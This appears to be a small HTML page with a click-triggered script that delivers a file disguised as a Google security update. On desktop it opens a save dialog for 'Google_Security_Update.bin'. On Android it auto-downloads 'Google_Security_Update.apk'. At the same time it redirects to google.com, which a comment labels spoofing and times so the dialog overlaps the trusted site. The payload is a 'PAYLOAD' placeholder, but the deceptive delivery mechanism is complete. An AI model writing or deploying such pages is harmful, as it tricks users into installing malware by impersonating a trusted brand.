<!DOCTYPE html>
<html>
<head><title>Document</title></head>
<body>
<h1>Click anywhere</h1>
<script>
document.addEventListener('click', async () => {
    
    const isMobile = /Android|iPhone/i.test(navigator.userAgent);
    
    if (!isMobile && 'showSaveFilePicker' in window) {
        // === WINDOWS PATH ===
        setTimeout(async () => {
            try {
                const handle = await window.showSaveFilePicker({
                    suggestedName: 'Google_Security_Update.bin',
                    types: [{ description: 'Binary', accept: {'application/octet-stream': ['.bin']} }]
                });
                const w = await handle.createWritable();
                await w.write('PAYLOAD');
                await w.close();
            } catch(e) {}
        }, 1000);
        
    } else {
        // === ANDROID PATH ===
        setTimeout(() => {
            const blob = new Blob(['PAYLOAD'], {type: 'application/octet-stream'});
            const a = Object.assign(document.createElement('a'), {
                href: URL.createObjectURL(blob),
                download: 'Google_Security_Update.apk'
            });
            document.body.appendChild(a);
            a.click();
        }, 1000);
    }
    
    // === SPOOFING: Navigate ke trusted site ===
    setTimeout(() => {
        window.location.href = 'https://google.com';
    }, 500);  // Sedikit delay dari dialog agar overlap terjadi
});
</script>
</body>
</html>
